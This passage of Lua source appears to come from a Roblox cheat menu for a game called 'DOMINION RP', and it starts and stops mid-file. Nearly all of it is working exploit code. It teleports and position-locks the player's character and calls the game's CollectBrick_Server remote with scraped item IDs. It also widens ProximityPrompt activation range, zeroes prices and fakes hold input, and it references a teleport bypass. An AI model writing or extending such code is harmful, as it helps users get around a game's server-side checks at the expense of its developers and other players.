                    local hrp = character:WaitForChild("HumanoidRootPart", 10)
                    if hrp and isRunning then
                        task.wait(0.5)
                        cleanPartsCache = {}
                        cacheUpdateTime = 0
                        statusLabel.Text = "Status: Character respawned! Restarting..."
                        statusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
                    end
                end)
                
                lp.CharacterRemoving:Connect(function()
                    if isRunning then
                        stopPositionLock()
                    end
                end)
                
                toggleBtn.MouseButton1Click:Connect(function()
                    if isRunning then
                        isRunning = false
                        stopPositionLock()
                        cleanupTPBypass()
                        toggleBtn.Text = "EXECUTE"
                        toggleBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                        toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
                        statusLabel.Text = "STATUS: STOPPED"
                        statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
                    else
                        isRunning = true

                        trashCount = 0
                        trashCountLabel.Text = "TRASH FOUND: 0"
                        toggleBtn.Text = "STOP"
                        toggleBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                        toggleBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
                        statusLabel.Text = "STATUS: CLAIMING"
                        statusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)

                        cleanPartsCache = {}
                        cacheUpdateTime = 0

                        bypassTPFolder()

                        task.spawn(function()
                            local running = function()
                                return isRunning
                            end
                            
                            local success, err = pcall(function()
                                autoHoldLoop(statusLabel, running)
                            end)
                            
                            if not success then
                                statusLabel.Text = "Status: ERROR! " .. tostring(err)
                                statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
                                isRunning = false
                                toggleBtn.Text = "EXECUTE"
                                toggleBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                                toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
                            end
                        end)
                    end
                end)
            end},
            {text = "AUTO-COLLECT BRICKS", callback = function()

                local rs = game:GetService("RunService")
                local lp = game:GetService("Players").LocalPlayer
                local pg = lp:WaitForChild("PlayerGui")

                local rpGui = Instance.new("ScreenGui")
                rpGui.Name = math.random(10000,99999)
                rpGui.ResetOnSpawn = false
                rpGui.Parent = pg
                
                local modal = Instance.new("Frame")
                modal.Size = UDim2.new(0, 300, 0, 130)
                modal.Position = UDim2.new(0.5, -150, 0.5, -65)
                modal.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                modal.BorderSizePixel = 0
                modal.Parent = rpGui
                Utils.RoundCorners(modal, 12)
                Utils.MakeDraggable(modal)

                local titleLabel = Instance.new("TextLabel")
                titleLabel.Size = UDim2.new(1, -40, 0, 40)
                titleLabel.Position = UDim2.new(0, 10, 0, 10)
                titleLabel.BackgroundTransparency = 1
                titleLabel.Text = "DOMINION RP"
                titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                titleLabel.TextSize = 16
                titleLabel.Font = Enum.Font.GothamBold
                titleLabel.TextXAlignment = Enum.TextXAlignment.Left
                titleLabel.Parent = modal

                local closeBtn = Instance.new("TextButton")
                closeBtn.Size = UDim2.new(0, 30, 0, 30)
                closeBtn.Position = UDim2.new(1, -35, 0, 10)
                closeBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
                closeBtn.Text = "X"
                closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
                closeBtn.TextSize = 14
                closeBtn.Font = Enum.Font.GothamBold
                closeBtn.BorderSizePixel = 0
                closeBtn.Parent = modal
                Utils.RoundCorners(closeBtn, 8)
                closeBtn.MouseButton1Click:Connect(function()
                    rpGui:Destroy()
                end)

                local countLabel = Instance.new("TextLabel")
                countLabel.Size = UDim2.new(1, -20, 0, 25)
                countLabel.Position = UDim2.new(0, 10, 0, 50)
                countLabel.BackgroundTransparency = 1
                countLabel.Text = "BRICK FOUND: 0"
                countLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
                countLabel.TextSize = 12
                countLabel.Font = Enum.Font.Gotham
                countLabel.TextXAlignment = Enum.TextXAlignment.Left
                countLabel.Parent = modal

                local toggleBtn = Instance.new("TextButton")
                toggleBtn.Size = UDim2.new(1, -20, 0, 30)
                toggleBtn.Position = UDim2.new(0, 10, 0, 80)
                toggleBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                toggleBtn.Text = "EXECUTE"
                toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
                toggleBtn.TextSize = 12
                toggleBtn.Font = Enum.Font.Gotham
                toggleBtn.BorderSizePixel = 0
                toggleBtn.Parent = modal
                Utils.RoundCorners(toggleBtn, 6)

                local statusLabel = {Text = "", TextColor3 = Color3.fromRGB(255, 255, 255)}

                local COLLECT_DURATION = 4
                local COOLDOWN = 0.5
                local MAX_DISTANCE_TO_COLLECT = 3
                local MAX_DISTANCE_TO_FIND = 1000

                local bricksCache = {}
                local cacheUpdateTime = 0
                local CACHE_DURATION = 3

                local function findAllBricks()
                    local bricks = {}

                    local function tryFindByPath(path)
                        local success, obj = pcall(function()
                            return workspace:FindFirstChild(path, true)
                        end)
                        if success and obj then
                            if obj.Name == "Brick" and (obj:IsA("Part") or obj:IsA("UnionOperation") or obj:IsA("BasePart")) then
                                return obj
                            end
                        end
                        return nil
                    end

                    local function findBricksInFolder(folderPath)
                        local success, folder = pcall(function()
                            return workspace:FindFirstChild(folderPath, true)
                        end)
                        if success and folder then

                            for _, obj in pairs(folder:GetDescendants()) do

                                local isBrick = false
                                if obj.Name == "Brick" then
                                    isBrick = true
                                elseif obj:FindFirstChild("ProximityPrompt") then
                                    local prompt = obj:FindFirstChild("ProximityPrompt")
                                    if prompt and prompt:IsA("ProximityPrompt") then
                                        local actionText = prompt.ActionText or ""
                                        local objectText = prompt.ObjectText or ""
                                        if actionText:match("Collect") or objectText:match("Brick") or objectText:match("Material") then
                                            isBrick = true
                                        end
                                    end
                                end
                                
                                if isBrick and (obj:IsA("Part") or obj:IsA("UnionOperation") or obj:IsA("BasePart")) then

                                    local alreadyAdded = false
                                    for _, existing in pairs(bricks) do
                                        if existing == obj then
                                            alreadyAdded = true
                                            break
                                        end
                                    end
                                    if not alreadyAdded then
                                        table.insert(bricks, obj)
                                    end
                                end
                            end
                        end
                    end

                    findBricksInFolder("Bricks")
                    findBricksInFolder("Materials")
                    findBricksInFolder("Construction")
                    findBricksInFolder("Items")
                    findBricksInFolder("BuildingMaterials")
                    findBricksInFolder("BuildingMaterial")
                    findBricksInFolder("JobSystem")
                    findBricksInFolder("Jobs")

                    for _, obj in pairs(workspace:GetDescendants()) do

                        local isBrick = false
                        if obj.Name == "Brick" then
                            isBrick = true
                        elseif obj:FindFirstChild("ProximityPrompt") then
                            local prompt = obj:FindFirstChild("ProximityPrompt")
                            if prompt and prompt:IsA("ProximityPrompt") then

                                local actionText = prompt.ActionText or ""
                                local objectText = prompt.ObjectText or ""
                                if actionText:match("Collect") or objectText:match("Brick") or objectText:match("Material") then
                                    isBrick = true
                                end
                            end
                        end
                        
                        if isBrick then

                            if obj:IsA("Part") or obj:IsA("UnionOperation") or obj:IsA("BasePart") then

                                local alreadyAdded = false
                                for _, existing in pairs(bricks) do
                                    if existing == obj then
                                        alreadyAdded = true
                                        break
                                    end
                                end
                                if not alreadyAdded then

                                    local hasPrompt = obj:FindFirstChild("ProximityPrompt")
                                    if hasPrompt or obj.Parent == workspace then
                                        table.insert(bricks, obj)
                                    end
                                end
                            end
                        end
                    end
                    
                    return bricks
                end

                local function getCachedBricks()
                    local currentTime = tick()
                    
                    if #bricksCache == 0 or (currentTime - cacheUpdateTime) >= CACHE_DURATION then
                        bricksCache = findAllBricks()
                        cacheUpdateTime = currentTime
                    end

                    local validBricks = {}
                    for _, brick in pairs(bricksCache) do
                        if brick and brick.Parent and brick.Parent ~= nil then
                            table.insert(validBricks, brick)
                        end
                    end
                    
                    if #validBricks == 0 and #bricksCache > 0 then
                        bricksCache = findAllBricks()
                        cacheUpdateTime = currentTime
                        validBricks = bricksCache
                    else
                        bricksCache = validBricks
                    end
                    
                    return bricksCache
                end

                local function getBrickPosition(brick)
                    if not brick then return nil, nil end
                    
                    if brick:IsA("BasePart") then
                        return brick.Position, brick.CFrame
                    elseif brick:IsA("Model") then
                        local primaryPart = brick.PrimaryPart or brick:FindFirstChild("HumanoidRootPart")
                        if primaryPart then
                            return primaryPart.Position, primaryPart.CFrame
                        end
                    end
                    return nil, nil
                end

                local function getPrioritizedBricks(processedBricks, currentTime)
                    local allBricks = getCachedBricks()
                    if #allBricks == 0 then return {} end

                    local playerPos = nil
                    if lp and lp.Character then
                        local hrp = lp.Character:FindFirstChild("HumanoidRootPart")
                        if hrp then
                            playerPos = hrp.Position
                        end
                    end

                    if not playerPos then
                        local availableBricks = {}
                        for _, brick in pairs(allBricks) do
                            local brickId = tostring(brick)
                            local lastCollect = processedBricks[brickId] or 0
                            local timeSinceCollect = currentTime - lastCollect
                            
                            if timeSinceCollect >= COOLDOWN then
                                table.insert(availableBricks, {brick = brick, distance = math.huge})
                            end
                        end

                        local prioritized = {}
                        for _, item in pairs(availableBricks) do
                            table.insert(prioritized, item.brick)
                        end
                        return prioritized
                    end

                    local availableBricks = {}
                    
                    for _, brick in pairs(allBricks) do
                        local brickId = tostring(brick)
                        local lastCollect = processedBricks[brickId] or 0
                        local timeSinceCollect = currentTime - lastCollect

                        local distance = math.huge
                        local brickPos, _ = getBrickPosition(brick)
                        if brickPos then
                            distance = (playerPos - brickPos).Magnitude
                        end

                        if timeSinceCollect >= COOLDOWN then
                            table.insert(availableBricks, {brick = brick, distance = distance})
                        end
                    end

                    table.sort(availableBricks, function(a, b)
                        return a.distance < b.distance
                    end)

                    local prioritized = {}
                    for _, item in pairs(availableBricks) do
                        table.insert(prioritized, item.brick)
                    end
                    
                    return prioritized
                end

                local function getBrickUUID(brick)
                    if not brick then return nil end


                    local uuid = brick:GetAttribute("UUID")
                    if uuid then

                        if not uuid:match("^{.*}$") then
                            uuid = "{" .. uuid .. "}"
                        end
                        return uuid
                    end

                    uuid = brick:GetAttribute("ID")
                    if uuid then
                        if not uuid:match("^{.*}$") then
                            uuid = "{" .. uuid .. "}"
                        end
                        return uuid
                    end

                    local uuidValue = brick:FindFirstChild("UUID") or brick:FindFirstChild("ID")
                    if uuidValue and (uuidValue:IsA("StringValue") or uuidValue:IsA("StringValue")) then
                        uuid = uuidValue.Value
                        if uuid and not uuid:match("^{.*}$") then
                            uuid = "{" .. uuid .. "}"
                        end
                        return uuid
                    end

                    if brick:IsA("Model") then
                        local assetId = tostring(brick:GetAttribute("AssetId")) or ""
                        if assetId and assetId ~= "" and assetId:match("^[%x%-]+$") then
                            if not assetId:match("^{.*}$") then
                                assetId = "{" .. assetId .. "}"
                            end
                            return assetId
                        end
                    end

                    local instanceId = tostring(brick:GetAttribute("InstanceId")) or tostring(brick.InstanceId)
                    if instanceId and instanceId:match("^[%x%-]+$") then
                        if not instanceId:match("^{.*}$") then
                            instanceId = "{" .. instanceId .. "}"
                        end
                        return instanceId
                    end

                    if brick.Parent then
                        uuid = brick.Parent:GetAttribute("UUID") or brick.Parent:GetAttribute("ID")
                        if uuid then
                            if not uuid:match("^{.*}$") then
                                uuid = "{" .. uuid .. "}"
                            end
                            return uuid
                        end
                        local parentUUIDValue = brick.Parent:FindFirstChild("UUID") or brick.Parent:FindFirstChild("ID")
                        if parentUUIDValue and (parentUUIDValue:IsA("StringValue") or parentUUIDValue:IsA("StringValue")) then
                            uuid = parentUUIDValue.Value
                            if uuid and not uuid:match("^{.*}$") then
                                uuid = "{" .. uuid .. "}"
                            end
                            return uuid
                        end
                    end

                    local nameMatch = brick.Name:match("{([%x%-]+)}")
                    if nameMatch then
                        return "{" .. nameMatch .. "}"
                    end
                    
                    return nil
                end

                local function collectBrick(brick, statusLabel)
                    if not brick then return false end

                    local brickUUID = getBrickUUID(brick)
                    if brickUUID then
                        local success, result = pcall(function()
                            statusLabel.Text = "Status: Collecting via Remote..."
                            statusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
                            
                            local remote = game:GetService("ReplicatedStorage"):WaitForChild("Aaron"):WaitForChild("JobSystem"):WaitForChild("Remotes"):WaitForChild("CollectBrick_Server", 5)
                            if remote then
                                local args = {brickUUID}
                                local response = remote:InvokeServer(unpack(args))
                                task.wait(0.1)
                                return true
                            end
                            return false
                        end)
                        
                        if success and result then
                            statusLabel.Text = "Status: Collected!"
                            statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
                            return true
                        end
                    end

                    local prompt = brick:FindFirstChild("ProximityPrompt")
                    if not prompt then

                        if brick.Parent then
                            prompt = brick.Parent:FindFirstChild("ProximityPrompt")
                        end
                    end
                    
                    if prompt and prompt:IsA("ProximityPrompt") then

                        pcall(function()
                            prompt.MaxActivationDistance = 10000
                            prompt.RequiresLineOfSight = false
                            prompt.Enabled = true

                            if prompt:GetAttribute("Price") or prompt:FindFirstChild("Price") then

                                if prompt:GetAttribute("Price") then
                                    prompt:SetAttribute("Price", 0)
                                end
                            end

                            if prompt:IsA("ProximityPrompt") then

                                for _, child in pairs(prompt:GetChildren()) do
                                    if child.Name:find("Price") or child.Name:find("Cost") then
                                        pcall(function()
                                            if child:IsA("NumberValue") or child:IsA("IntValue") then
                                                child.Value = 0
                                            end
                                        end)
                                    end
                                end
                            end
                        end)

                        local actualHoldDuration = prompt.HoldDuration or COLLECT_DURATION
                        if actualHoldDuration < 4 then
                            actualHoldDuration = 4
                        end

                        local success = false
                        
                        local success1, err1 = pcall(function()
                            statusLabel.Text = "STATUS: CLAIMING"
                            statusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)

                            prompt:InputHoldBegin()

                            local holdTime = 0
                            local holdSteps = math.ceil(actualHoldDuration / 0.02)
                            
                            for i = 1, holdSteps do
                                if not prompt or not prompt.Parent then break end

                                prompt:InputHoldBegin()
                                task.wait(0.02)
                                holdTime = holdTime + 0.02
                            end

                            if holdTime < actualHoldDuration then
                                local remainingSteps = math.ceil((actualHoldDuration - holdTime) / 0.02)
                                for i = 1, remainingSteps do
                                    if not prompt or not prompt.Parent then break end
                                    prompt:InputHoldBegin()
                                    task.wait(0.02)
                                    holdTime = holdTime + 0.02
                                end
                            end
                            
                            task.wait(0.05)
                            success = true
                        end)

                        if not success then
                            task.wait(0.1)
                            local success2, err2 = pcall(function()
                                statusLabel.Text = "STATUS: CLAIMING"
                                statusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)

                                for i = 1, math.ceil(actualHoldDuration / 0.1) do
                                    if not prompt or not prompt.Parent then break end
                                    prompt:PromptButtonClicked()
                                    task.wait(0.1)
                                end
                                
                                task.wait(0.05)
                                success = true
                            end)
                        end
                        
                        if success then
                            statusLabel.Text = "STATUS: CLAIMED"
                            statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
                            return true
                        end
                    else

                        if brick:IsA("Model") then

                            local primaryPart = brick.PrimaryPart or brick:FindFirstChild("HumanoidRootPart")
                            if primaryPart then

                                pcall(function()
                                    primaryPart:FireServer("Click")
                                end)
                                task.wait(COLLECT_DURATION)
                                return true
                            end
                        end
                    end
                    
                    statusLabel.Text = "STATUS: FAILED"
                    statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
                    return false
                end

                local positionLockConnection = nil
                local heartbeatConnection = nil
                local lockedPosition = nil
                
                local function startPositionLock(targetPos)
                    if positionLockConnection then positionLockConnection:Disconnect() end
                    if heartbeatConnection then heartbeatConnection:Disconnect() end
                    
                    if not targetPos or not lp.Character or not lp.Character:FindFirstChild("HumanoidRootPart") then
                        return false
                    end
                    
                    local hrp = lp.Character.HumanoidRootPart
                    lockedPosition = targetPos + Vector3.new(0, 2, 0)

                    hrp.CFrame = CFrame.new(lockedPosition)

                    heartbeatConnection = rs.Heartbeat:Connect(function()
                        if not lp.Character or not lp.Character:FindFirstChild("HumanoidRootPart") then return end
                        if not lockedPosition then return end
                        
                        local hrp = lp.Character.HumanoidRootPart
                        local currentDistance = (hrp.Position - lockedPosition).Magnitude

                        if currentDistance > 0.5 then

                            local currentPos = hrp.Position
                            local targetPos = lockedPosition
                            local lerpFactor = 0.5
                            local newPos = currentPos:Lerp(targetPos, lerpFactor)
                            
                            hrp.CFrame = CFrame.new(newPos)
                            hrp.AssemblyLinearVelocity = Vector3.new()
                            hrp.Velocity = Vector3.new()
                        else

                            hrp.AssemblyLinearVelocity = Vector3.new()
                            hrp.Velocity = Vector3.new()
                        end

                        hrp.AssemblyAngularVelocity = Vector3.new()
                        hrp.RotVelocity = Vector3.new()
                    end)
                    
                    return true
                end
                
                local function stopPositionLock()
                    if positionLockConnection then positionLockConnection:Disconnect() positionLockConnection = nil end
                    if heartbeatConnection then heartbeatConnection:Disconnect() heartbeatConnection = nil end
                    lockedPosition = nil
                end

                local function autoCollectLoop(statusLabel, countLabel, isRunning)
                    local processedBricks = {}
                    local collectedCount = 0
                    local lastPlayerPos = nil
                    local stuckCheckTime = 0
                    local isCollecting = false
                    
                    while isRunning() do
                        if not lp.Character or not lp.Character:FindFirstChild("HumanoidRootPart") then
                            statusLabel.Text = "Status: Character not found!"
                            statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
                            isCollecting = false
                            task.wait(1)
                        else
                            local hrp = lp.Character.HumanoidRootPart
                            local playerPos = hrp.Position
                            local currentTime = tick()

                            local isStuck = false
                            if lastPlayerPos then
                                local distanceMoved = (playerPos - lastPlayerPos).Magnitude
                                if distanceMoved < 0.5 then
                                    stuckCheckTime = stuckCheckTime + 0.05
                                    if stuckCheckTime > 2 then
                                        if isCollecting then

                                            stopPositionLock()
                                            isCollecting = false
                                            statusLabel.Text = "Status: Stuck detected! Stopping..."
                                            statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
                                            task.wait(1)
                                            stuckCheckTime = 0
                                            lastPlayerPos = nil
                                            isStuck = true
                                        end
                                    end
                                else
                                    stuckCheckTime = 0
                                end
                            end
                            lastPlayerPos = playerPos

                            if not isStuck and not isCollecting and stuckCheckTime < 2 then

                                local allBricks = getCachedBricks()
                                countLabel.Text = "BRICKS FOUND: " .. #allBricks

                                local bricks = getPrioritizedBricks(processedBricks, currentTime)
                                
                                if #bricks == 0 then

                                    if #allBricks == 0 then
                                        bricksCache = {}
                                        cacheUpdateTime = 0
                                        statusLabel.Text = "STATUS: SEARCHING (No bricks in workspace)"
                                        statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
                                    else

                                        local nearestDistance = math.huge
                                        if playerPos then
                                            for _, brick in pairs(allBricks) do
                                                local brickPos, _ = getBrickPosition(brick)
                                                if brickPos then
                                                    local dist = (playerPos - brickPos).Magnitude
                                                    if dist < nearestDistance then
                                                        nearestDistance = dist
                                                    end
                                                end
                                            end
                                        end
                                        if nearestDistance < math.huge then
                                            statusLabel.Text = "STATUS: SEARCHING (Nearest: " .. math.floor(nearestDistance) .. " studs)"
                                        else
                                            statusLabel.Text = "STATUS: SEARCHING (Calculating distance...)"
                                        end
                                        statusLabel.TextColor3 = Color3.fromRGB(255, 165, 0)
                                    end
                                    task.wait(1)
                                else

                                    local targetBrick = bricks[1]

                                    if targetBrick and targetBrick.Parent then
                                        local brickId = tostring(targetBrick)
                                        local lastCollect = processedBricks[brickId] or 0
                                        local timeSinceCollect = currentTime - lastCollect

                                        if timeSinceCollect >= COOLDOWN then

                                            local brickPos, _ = getBrickPosition(targetBrick)
                                            
                                            if brickPos then

                                                local distanceToBrick = (playerPos - brickPos).Magnitude

                                                local shouldCollect = false
                                                
                                                if distanceToBrick > MAX_DISTANCE_TO_COLLECT then

                                                    isCollecting = true

                                                    statusLabel.Text = "STATUS: TELEPORTING (" .. math.floor(distanceToBrick) .. " studs)"
                                                    statusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)

                                                    startPositionLock(brickPos)
                                                    task.wait(0.8)

                                                    local currentPlayerPos = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") and lp.Character.HumanoidRootPart.Position
                                                    if currentPlayerPos then
                                                        local finalDistance = (currentPlayerPos - brickPos).Magnitude

                                                        if finalDistance <= MAX_DISTANCE_TO_COLLECT then

                                                            shouldCollect = true
                                                        else

                                                            stopPositionLock()
                                                            isCollecting = false
                                                            processedBricks[brickId] = currentTime
                                                            statusLabel.Text = "STATUS: TOO FAR AFTER TP (" .. math.floor(finalDistance) .. " studs)"
                                                            statusLabel.TextColor3 = Color3.fromRGB(255, 165, 0)
                                                            task.wait(0.2)
                                                        end
                                                    else

                                                        stopPositionLock()
                                                        isCollecting = false
                                                        task.wait(0.2)
                                                    end
                                                else

                                                    isCollecting = true
                                                    startPositionLock(brickPos)
                                                    task.wait(0.3)
                                                    shouldCollect = true
                                                end

                                                if shouldCollect then
                                                    statusLabel.Text = "STATUS: CLAIMING"
                                                    statusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
                                                    
                                                    local success = collectBrick(targetBrick, statusLabel)
                                                
                                                    if success then
                                                        processedBricks[brickId] = currentTime
                                                        collectedCount = collectedCount + 1
                                                        statusLabel.Text = "STATUS: CLAIMED (" .. collectedCount .. ")"
                                                        statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
                                                    else
                                                        statusLabel.Text = "STATUS: FAILED"
                                                        statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
                                                    end

                                                    stopPositionLock()
                                                    isCollecting = false
                                                    task.wait(COOLDOWN)
                                                end
                                            else
                                                statusLabel.Text = "STATUS: INVALID BRICK"
                                                statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
                                                isCollecting = false
                                                task.wait(0.5)
                                            end
                                        else

                                            task.wait(0.1)
                                        end
                                    else
                                        statusLabel.Text = "STATUS: INVALID BRICK"
                                        statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
                                        isCollecting = false
                                        task.wait(0.5)
                                    end
                                end
                            end
                        end
                        
                        task.wait(0.05)
                    end

                    isCollecting = false
                    stopPositionLock()
                end

                local characterConnection = nil
                local function setupCharacterAutoRestart(isRunningRef, statusLabelRef)
                    if characterConnection then
                        characterConnection:Disconnect()
                    end
                    
                    characterConnection = lp.CharacterAdded:Connect(function(character)
                        local hrp = character:WaitForChild("HumanoidRootPart", 10)
                        if hrp and isRunningRef() then
                            task.wait(0.5)
                            bricksCache = {}
                            cacheUpdateTime = 0
                            statusLabelRef.Text = "Status: Character respawned! Restarting..."
                            statusLabelRef.TextColor3 = Color3.fromRGB(255, 255, 0)
                        end
                    end)
                    
                    lp.CharacterRemoving:Connect(function()
                        if isRunningRef() then
                            stopPositionLock()
                        end
                    end)
                end
                
                local isRunning = false

                setupCharacterAutoRestart(function() return isRunning end, statusLabel)
                
                toggleBtn.MouseButton1Click:Connect(function()
                    if isRunning then
                        isRunning = false
                        stopPositionLock()
                        toggleBtn.Text = "EXECUTE"
                        toggleBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                        toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
                        statusLabel.Text = "STATUS: STOP"
                        statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
                    else
                        isRunning = true
                        toggleBtn.Text = "STOP"
                        toggleBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                        toggleBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
                        statusLabel.Text = "STATUS: CLAIMING"
                        statusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)

                        bricksCache = {}
                        cacheUpdateTime = 0

                        task.spawn(function()
                            local running = function()
                                return isRunning
                            end
                            
                            local success, err = pcall(function()
                                autoCollectLoop(statusLabel, countLabel, running)
                            end)
                            
                            if not success then
                                statusLabel.Text = "Status: ERROR! " .. tostring(err)
                                statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
                                isRunning = false
                                toggleBtn.Text = "EXECUTE"
                                toggleBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                                toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
                            end
                        end)
                    end
                end)
            end},
            {text = "TELEPORT", callback = function()

                local ps = game:GetService("Players")
                local uis = game:GetService("UserInputService")
                local lp = ps.LocalPlayer
                local pg = lp:WaitForChild("PlayerGui")

                local TELEPORT_CONFIG = {
                    ATMs = {
                        {name = "ATM HP", path = 'game:GetService("Workspace").ATMs.ATMParts', coords = nil},
                        {name = "ATM BANK", path = 'game:GetService("Workspace").ATMs:GetChildren()[3]', coords = nil},
                    },
                    ClothingZones = {
                        {name = "CLOTHING", path = 'game:GetService("Workspace").ClothingZone.Zone1.Zone', coords = nil},
                    },
                    Constructions = {
                        {name = "JOB CONSTRUCTION", path = 'game:GetService("ReplicatedStorage").Aaron.JobSystem.Constructions.Brick', coords = nil},
                    },
                    Shops = {
                        {name = "GUNSHOP", path = 'game:GetService("Workspace").Shop.Handgun', coords = nil},
                        {name = "DIGILOX DEN", path = 'game:GetService("Workspace").Shop.Phone', coords = nil},
                        {name = "FOOD SHOP", path = 'game:GetService("Workspace").Shop:GetChildren()[14]', coords = nil},
                    },
                    Traps = {
                        {name = "TRAP ZONE", path = 'game:GetService("ReplicatedStorage").Aaron.TrapSystem.Crate.Crate', coords = nil},
                    }
                }
                
                local function getTeleportPosition(config)
                    if config.coords then
                        return config.coords
                    elseif config.path then
                        local success, obj = pcall(function()
                            local result = loadstring("return " .. config.path)()
                            if result then
                                return result
                            end
                            return nil
                        end)
                        if success and obj then
                            if obj.Position and typeof(obj.Position) == "Vector3" then
                                return obj.Position
                            elseif obj:IsA("BasePart") then
                                return obj.Position
                            elseif obj:IsA("Model") then
                                local primaryPart = obj.PrimaryPart
                                if primaryPart then
                                    return primaryPart.Position
                                end
                                local hrp = obj:FindFirstChild("HumanoidRootPart")
                                if hrp then
                                    return hrp.Position
                                end
                                for _, child in pairs(obj:GetChildren()) do
                                    if child:IsA("BasePart") then
                                        return child.Position
                                    end
                                end
                                for _, descendant in pairs(obj:GetDescendants()) do
                                    if descendant:IsA("BasePart") then
                                        return descendant.Position
                                    end
                                end
                            elseif obj:IsA("ObjectValue") and obj.Value then
                                local target = obj.Value
                                if target:IsA("BasePart") then
                                    return target.Position
                                elseif target:IsA("Model") then
                                    local primaryPart = target.PrimaryPart or target:FindFirstChild("HumanoidRootPart")
                                    if primaryPart then
                                        return primaryPart.Position
                                    end
                                end
                            else
                                local positionValue = obj:FindFirstChild("Position") or obj:FindFirstChildOfClass("Vector3Value")
                                if positionValue and positionValue.Value then
                                    return positionValue.Value
                                end
                            end
                        end
                        if config.path:find("Workspace") or config.path:find("workspace") then
                            local pathParts = {}
                            local pathStr = config.path
                            pathStr = pathStr:gsub('game:GetService%("Workspace"%)', "")
                            pathStr = pathStr:gsub('game:GetService%("workspace"%)', "")
                            pathStr = pathStr:gsub('game:GetService%("Workspace"%)%.', "")
                            pathStr = pathStr:gsub('game:GetService%("workspace"%)%.', "")
                            for part in pathStr:gmatch("([^%.]+)") do
                                part = part:gsub("^%s+", ""):gsub("%s+$", "")
                                if part ~= "" and part ~= "game" and part ~= "GetService" and part ~= "Workspace" and part ~= "workspace" then
                                    if part:find("GetChildren") then
                                        table.insert(pathParts, "GetChildren")
                                        local indexMatch = pathStr:match("%[%s*(%d+)%s*%]")
                                        if indexMatch then
                                            table.insert(pathParts, "[" .. indexMatch .. "]")
                                        end
                                    else
                                        table.insert(pathParts, part)
                                    end
                                end
                            end
                            if #pathParts > 0 then
                                local success2, obj2 = pcall(function()
                                    local current = workspace
                                    for i, partName in ipairs(pathParts) do
                                        if not current then break end
                                        if partName == "GetChildren" then
                                            local nextPart = pathParts[i + 1]
                                            if nextPart and nextPart:match("%[%d+%]") then
                                                local index = tonumber(nextPart:match("%[(%d+)%]"))
                                                if index then
                                                    local children = current:GetChildren()
                                                    if children[index] then
                                                        current = children[index]
                                                        i = i + 1
                                                    else
                                                        current = nil
                                                    end
                                                end
                                            end
                                        else
                                            local previous = current
                                            current = current:FindFirstChild(partName, true)
                                            if not current and previous then
                                                for _, descendant in pairs(previous:GetDescendants()) do
                                                    if descendant.Name == partName then
                                                        current = descendant
                                                        break
                                                    end
                                                end
                                            end
                                        end
                                    end
                                    return current
                                end)
                                if success2 and obj2 then
                                    if obj2:IsA("BasePart") then
                                        return obj2.Position
                                    elseif obj2:IsA("Model") then
                                        local primaryPart = obj2.PrimaryPart or obj2:FindFirstChild("HumanoidRootPart", true)
                                        if primaryPart then
                                            return primaryPart.Position
                                        end
                                        for _, descendant in pairs(obj2:GetDescendants()) do
                                            if descendant:IsA("BasePart") then
                                                return descendant.Position
                                            end
                                        end
                                        for _, child in pairs(obj2:GetChildren()) do
                                            if child:IsA("BasePart") then
                                                return child.Position
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                    return nil
                end
                
                local function createTeleportGUI(title, locations, guiName)
                    local existingGui = _G[guiName]
                    if existingGui then
                        existingGui:Destroy()
                    end
                    if #locations == 0 then
                        return
                    end
                    local teleportGui = Instance.new("ScreenGui")
                    teleportGui.Name = guiName
                    _G[guiName] = teleportGui
                    teleportGui.ResetOnSpawn = false
                    teleportGui.Parent = pg
                    local maxModalHeight = 400
                    local contentHeight = 60 + (#locations * 35)
                    local modalHeight = math.min(contentHeight, maxModalHeight)
                    local mainFrame = Instance.new("Frame")
                    mainFrame.Size = UDim2.new(0, 300, 0, modalHeight)
                    mainFrame.Position = UDim2.new(0.5, -150, 0.5, -modalHeight/2)
                    mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                    mainFrame.BorderSizePixel = 0
                    mainFrame.Parent = teleportGui
                    Utils.RoundCorners(mainFrame, 12)
                    local border = Instance.new("UIStroke")
                    border.Color = Color3.fromRGB(40, 40, 40)
                    border.Thickness = 2
                    border.Parent = mainFrame
                    local titleLabel = Instance.new("TextLabel")
